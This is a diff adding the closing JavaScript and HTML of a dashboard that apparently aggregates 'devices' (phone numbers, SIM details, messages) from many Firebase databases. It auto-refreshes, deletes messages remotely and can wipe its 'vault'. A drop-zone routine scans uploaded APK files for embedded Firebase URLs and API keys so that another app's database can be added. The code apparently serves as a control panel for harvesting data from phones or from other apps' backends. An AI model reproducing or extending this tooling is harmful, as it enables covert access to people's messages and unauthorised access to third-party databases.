+        list.innerHTML = `<div style="text-align:center; padding: 30px; color:var(--green)">
+            <div style="font-size:2rem; margin-bottom:10px">✅</div>
+            No cross-database duplicates found.
+        </div>`;
+    } else {
+        list.innerHTML = duplicates.map(arr => {
+            const id = arr[0]._id;
+            const ph = arr[0].customPh || arr[0].mobNo || arr[0].sims?.[0]?.phoneNumber || 'Unknown';
+            const srcBadges = arr.map(d => {
+                const sData = SOURCES.find(s => s.key === d._src);
+                const col = sData ? sData.color : 'var(--cyan)';
+                return `<span style="padding:4px 8px; border-radius:4px; font-size:0.75rem; background:rgba(255,255,255,0.05); border:1px solid ${col}; color:${col}">${d._src}</span>`;
+            }).join('');
+            
+            return `
+            <div style="background:var(--bg-card); border:1px solid var(--border); border-radius:8px; padding:12px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; padding-bottom:12px; border-bottom:1px solid rgba(255,255,255,0.05)">
+                    <div style="font-family:var(--font-mono); font-weight:700; color:var(--amber)">${id}</div>
+                    <div style="font-size:0.85rem; color:var(--text-muted)">${ph}</div>
+                </div>
+                <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center">
+                    <span style="font-size:0.75rem; color:var(--text-muted)">Found in:</span>
+                    ${srcBadges}
+                </div>
+            </div>`;
+        }).join('');
+    }
+    
+    document.getElementById('dupModal').classList.add('active');
+}
+
+// ═══ BACKGROUND AUTO-REFRESH ═══
+// Automatically pull live data every 10 seconds silently
+setInterval(() => {
+    // Only run if there isn't already an active manual fetch happening
+    if (document.getElementById('loader').classList.contains('hidden')) {
+        fetchAll(true); // true = silent background mode
+    }
+}, 10000);
+
+// Initialize removed to prevent double-fetch before bootNexus completes
+// Mobile Pull-to-Refresh Logic
+let touchStartY = 0;
+let isPulling = false;
+const devList = document.getElementById('devList');
+
+devList.addEventListener('touchstart', e => {
+    if (devList.scrollTop === 0) {
+        touchStartY = e.touches[0].clientY;
+        isPulling = true;
+    }
+}, {passive: true});
+
+devList.addEventListener('touchmove', e => {
+    if (!isPulling) return;
+    const touchY = e.touches[0].clientY;
+    const pullDist = touchY - touchStartY;
+    
+    // Only intercept if pulling down from the top
+    if (pullDist > 0 && devList.scrollTop === 0) {
+    }
+}, {passive: true});
+
+devList.addEventListener('touchend', e => {
+    if (!isPulling) return;
+    isPulling = false;
+    const touchY = e.changedTouches[0].clientY;
+    const pullDist = touchY - touchStartY;
+    
+    if (pullDist > 80 && devList.scrollTop === 0) {
+        // Trigger a soft refresh (sync) if pulled down more than 80px
+        fetchAll();
+    }
+});
+let ctxTarget = null;
+function showContextMenu(e, src, id) {
+    e.preventDefault();
+    ctxTarget = { src, id };
+    const menu = document.getElementById('contextMenu');
+    let x = e.clientX;
+    let y = e.clientY;
+    
+    menu.style.display = 'block';
+    const rw = menu.offsetWidth;
+    const rh = menu.offsetHeight;
+    if (x + rw > window.innerWidth) x = window.innerWidth - rw - 10;
+    if (y + rh > window.innerHeight) y = window.innerHeight - rh - 10;
+    
+    menu.style.left = x + 'px';
+    menu.style.top = y + 'px';
+    menu.classList.add('active');
+}
+
+function execContext(action, el) {
+    if (!ctxTarget) return;
+    const { src, id } = ctxTarget;
+    
+    if (action === 'copy-id') {
+        navigator.clipboard.writeText(id);
+        if(el) {
+            const orig = el.innerHTML;
+            el.innerHTML = '✅ Copied!';
+            setTimeout(() => { document.getElementById('contextMenu').classList.remove('active'); el.innerHTML = orig; }, 600);
+            return;
+        }
+    } else if (action === 'copy-url') {
+        const sData = SOURCES.find(s => s.key === src);
+        if(sData) {
+            navigator.clipboard.writeText(sData.base);
+            if(el) {
+                const orig = el.innerHTML;
+                el.innerHTML = '✅ Copied!';
+                setTimeout(() => { document.getElementById('contextMenu').classList.remove('active'); el.innerHTML = orig; }, 600);
+                return;
+            }
+        }
+    }
+    
+    document.getElementById('contextMenu').classList.remove('active');
+}
+
+let ctxHub = null;
+function showHubContextMenu(e, src) {
+    e.preventDefault();
+    ctxHub = src;
+    const menu = document.getElementById('hubContextMenu');
+    let x = e.clientX; let y = e.clientY;
+    menu.style.display = 'block';
+    const rw = menu.offsetWidth; const rh = menu.offsetHeight;
+    if (x + rw > window.innerWidth) x = window.innerWidth - rw - 10;
+    if (y + rh > window.innerHeight) y = window.innerHeight - rh - 10;
+    menu.style.left = x + 'px'; menu.style.top = y + 'px';
+    menu.classList.add('active');
+}
+
+function execHubContext(action, el) {
+    if (!ctxHub) return;
+    if (action === 'copy-url') {
+        const sData = SOURCES.find(s => s.key === ctxHub);
+        if(sData) {
+            navigator.clipboard.writeText(sData.base);
+            if(el) {
+                const orig = el.innerHTML;
+                el.innerHTML = '✅ Copied!';
+                setTimeout(() => { document.getElementById('hubContextMenu').classList.remove('active'); el.innerHTML = orig; }, 600);
+            }
+        }
+    }
+}
+
+document.addEventListener('click', (e) => {
+    const menu = document.getElementById('contextMenu');
+    if (menu && menu.classList.contains('active')) menu.classList.remove('active');
+    
+    const hmenu = document.getElementById('hubContextMenu');
+    if (hmenu && hmenu.classList.contains('active')) hmenu.classList.remove('active');
+    
+    const userBtn = document.getElementById('userMenuBtn');
+    const userDrop = document.getElementById('userDropdown');
+    if (userBtn && userDrop && !userBtn.contains(e.target) && !userDrop.contains(e.target)) {
+        userDrop.style.display = 'none';
+    }
+});
+
+let msgToDelete = null;
+function promptDeleteMsg(localId) {
+    if (!selDev) return;
+    const msgs = cache[selDev._src+':'+selDev._id];
+    if(!msgs) return;
+    const m = msgs.find(x => x._localId == localId);
+    if(!m) return;
+    
+    msgToDelete = { dev: selDev, msg: m };
+    const preview = document.getElementById('delMsgPreview');
+    preview.textContent = m.message || m.body || '(Empty)';
+    document.getElementById('delMsgModal').classList.add('active');
+}
+
+async function executeDeleteMsg() {
+    if(!msgToDelete) return;
+    const { dev, msg } = msgToDelete;
+    const src = SOURCES.find(s => s.key === dev._src);
+    const token = src ? await getAuthToken(src) : null;
+    const authSuffix = token ? `?auth=${token}` : '';
+    
+    const p = msg._fbPath.replace('.json', '') + '/' + msg._fbKey + '.json';
+    const btn = document.getElementById('delMsgBtn');
+    btn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;border-top-color:#fff;"></div>';
+    
+    try {
+        await fetch(dev._base + p + authSuffix, { method: 'DELETE' });
+        let msgs = cache[dev._src+':'+dev._id];
+        if (msgs) {
+            cache[dev._src+':'+dev._id] = msgs.filter(x => x._localId != msg._localId);
+        }
+        renderTab(true);
+        document.getElementById('delMsgModal').classList.remove('active');
+        msgToDelete = null;
+    } catch(e) {
+        customAlert('Delete Failed', 'Failed to delete the message. The database may be locked.');
+    } finally {
+        btn.innerHTML = 'Delete';
+    }
+}
+
+function destroyVault() {
+    customPrompt('⚠️ DESTROY VAULT', 'This will permanently delete this Vault and all connected databases from the cloud. Type "DELETE" to confirm:', '', async (val) => {
+        if (val === null) return; // User cancelled
+        if (val !== 'DELETE') {
+            return customAlert('Aborted', 'Vault destruction cancelled. You must type exactly "DELETE" to confirm.');
+        }
+        
+        try {
+            const configId = CryptoJS.SHA256(MASTER_KEY).toString(CryptoJS.enc.Hex);
+            await fetch(`${HUB_URL}/vault_${configId}.json`, { method: 'DELETE' });
+            
+            // Completely purge all local data
+            localStorage.removeItem('medline_dbs_backup');
+            localStorage.removeItem('nexus_master_key');
+            MASTER_KEY = null;
+            
+            // Ultra-Minimal Premium Destruct Sequence
+            document.body.innerHTML = `
+                <div style="height: 100vh; width: 100vw; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #070709; font-family: 'Inter', system-ui, sans-serif;">
+                    <div style="position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 32px;">
+                        <div style="position: absolute; width: 64px; height: 64px; border: 1px solid rgba(239, 68, 68, 0.1); border-radius: 50%;"></div>
+                        <div class="spinner" style="width: 48px; height: 48px; border: 2px solid rgba(255,255,255,0.03); border-top-color: var(--red); border-right-color: transparent;"></div>
+                        <svg style="position: absolute; color: var(--red); opacity: 0.8;" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    </div>
+                    <div style="font-size: 0.7rem; font-weight: 600; letter-spacing: 6px; text-transform: uppercase; color: rgba(255,255,255,0.4); margin-left: 6px;">Destruct Sequence Engaged</div>
+                    <div style="font-size: 0.6rem; font-weight: 400; letter-spacing: 3px; color: var(--red); margin-top: 12px; opacity: 0.6; margin-left: 3px;">PURGING VAULT...</div>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                location.reload();
+            }, 1200);
+            
+        } catch(e) {
+            customAlert('Error', 'Failed to reach the Hub to delete the Vault. Check your internet connection.');
+        }
+    });
+}
+
+// --- APK EXTRACTION LOGIC ---
+function handleApkDrop(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    document.getElementById('apkDropZone').style.borderColor = 'rgba(255,255,255,0.1)';
+    document.getElementById('apkDropZone').style.background = 'rgba(0,0,0,0.2)';
+    
+    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
+        processApk(e.dataTransfer.files[0]);
+    }
+}
+
+function handleApkSelect(e) {
+    if (e.target.files && e.target.files.length > 0) {
+        processApk(e.target.files[0]);
+    }
+}
+
+async function processApk(file) {
+    if (!file.name.endsWith('.apk') && !file.name.endsWith('.zip')) {
+        customAlert('Invalid File', 'Only .apk files are supported for auto-extraction.');
+        return;
+    }
+    
+    const dropText = document.getElementById('apkDropText');
+    const originalText = dropText.innerText;
+    dropText.innerText = 'Scanning APK... Please wait.';
+    document.getElementById('apkDropZone').style.borderColor = 'var(--cyan)';
+    
+    try {
+        const extracted = await extractFirebaseConfig(file);
+        
+        if (!extracted || (!extracted.firebaseUrl && !extracted.apiKey)) {
+            customAlert('Extraction Failed', 'No Firebase configuration was found in this APK.');
+        } else {
+            if (extracted.firebaseUrl) {
+                document.getElementById('newDbUrl').value = extracted.firebaseUrl;
+            }
+            if (extracted.apiKey) {
+                document.getElementById('newDbApiKey').value = extracted.apiKey;
+            }
+            customAlert('Extraction Successful', 'Firebase credentials successfully extracted from the APK.');
+        }
+    } catch (err) {
+        console.error(err);
+        customAlert('Error', 'Failed to parse APK. The file may be corrupted or protected.');
+    } finally {
+        dropText.innerText = originalText;
+        document.getElementById('apkDropZone').style.borderColor = 'rgba(255,255,255,0.1)';
+        document.getElementById('apkFileInput').value = ''; // Reset input
+    }
+}
+
+async function extractFirebaseConfig(file) {
+    const buffer = await file.arrayBuffer();
+    const zip = await JSZip.loadAsync(buffer);
+    
+    let dbUrl = "";
+    let apiKey = "";
+    
+    const urlRegex = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi;
+    const keyRegex = /AIza[A-Za-z0-9_-]{35}/g;
+    
+    // Helper function to extract strings from Uint8Array
+    function extractStrings(uint8Array) {
+        let str = "";
+        // Process in chunks to avoid call stack limits
+        for (let i = 0; i < uint8Array.length; i += 65536) {
+            str += String.fromCharCode.apply(null, uint8Array.subarray(i, i + 65536));
+        }
+        
+        const urls = str.match(urlRegex);
+        const keys = str.match(keyRegex);
+        
+        return {
+            url: urls ? urls[0] : "",
+            key: keys ? keys[0] : ""
+        };
+    }
+    
+    // 1. Try resources.arsc (most common for hardcoded strings)
+    const arsc = zip.file("resources.arsc");
+    if (arsc) {
+        const data = await arsc.async("uint8array");
+        const extracted = extractStrings(data);
+        if (extracted.url) dbUrl = extracted.url;
+        if (extracted.key) apiKey = extracted.key;
+    }
+    
+    // 2. Try classes.dex files
+    if (!dbUrl || !apiKey) {
+        const dexFiles = ["classes.dex", "classes2.dex", "classes3.dex", "classes4.dex"];
+        for (const dexName of dexFiles) {
+            if (dbUrl && apiKey) break;
+            const dexFile = zip.file(dexName);
+            if (!dexFile) continue;
+            const data = await dexFile.async("uint8array");
+            const extracted = extractStrings(data);
+            if (!dbUrl && extracted.url) dbUrl = extracted.url;
+            if (!apiKey && extracted.key) apiKey = extracted.key;
+        }
+    }
+    
+    // 3. Try google-services.json
+    if (!dbUrl || !apiKey) {
+        const possiblePaths = [
+            zip.file("google-services.json"), 
+            zip.file("assets/google-services.json")
+        ];
+        
+        for (const jsonFile of possiblePaths) {
+            if (jsonFile) {
+                try {
+                    const jsonStr = await jsonFile.async("text");
+                    const config = JSON.parse(jsonStr);
+                    if (!dbUrl) dbUrl = config?.project_info?.firebase_url || "";
+                    if (!apiKey) apiKey = config?.client?.[0]?.api_key?.[0]?.current_key || "";
+                } catch (e) {
+                    console.warn("Failed parsing google-services.json", e);
+                }
+            }
+        }
+    }
+    
+    return (!dbUrl && !apiKey) ? null : { firebaseUrl: dbUrl, apiKey: apiKey };
+}
+</script>
+
+    <div class="modal-overlay" id="delMsgModal">
+        <div class="modal" style="max-width: 320px; text-align: center; padding: 24px;">
+            <div style="font-size: 1.2rem; font-weight: 700; color: var(--red); display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 16px;">
+                🗑️ Delete Message?
+            </div>
+            <div id="delMsgPreview" style="background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-sec); margin-bottom: 24px; text-align: left; overflow: hidden; text-overflow: ellipsis; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; border: 1px solid rgba(255,255,255,0.05);">
+            </div>
+            <div style="display: flex; gap: 12px;">
+                <button class="btn" style="flex: 1;" onclick="document.getElementById('delMsgModal').classList.remove('active')">Cancel</button>
+                <button class="btn primary" id="delMsgBtn" style="flex: 1; background: var(--red); color: #fff;" onclick="executeDeleteMsg()">Delete</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="contextMenu" class="context-menu">
+        <div class="c-header">Device Actions</div>
+        <div class="c-item" onclick="execContext('copy-id', this)">📋 Copy Device ID</div>
+        <div class="c-item" onclick="execContext('copy-url', this)">🔗 Copy Database URL</div>
+    </div>
+    
+    <div id="hubContextMenu" class="context-menu">
+        <div class="c-header">Database Actions</div>
+        <div class="c-item" onclick="execHubContext('copy-url', this)">🔗 Copy Database URL</div>
+    </div>
+</body>
+</html>
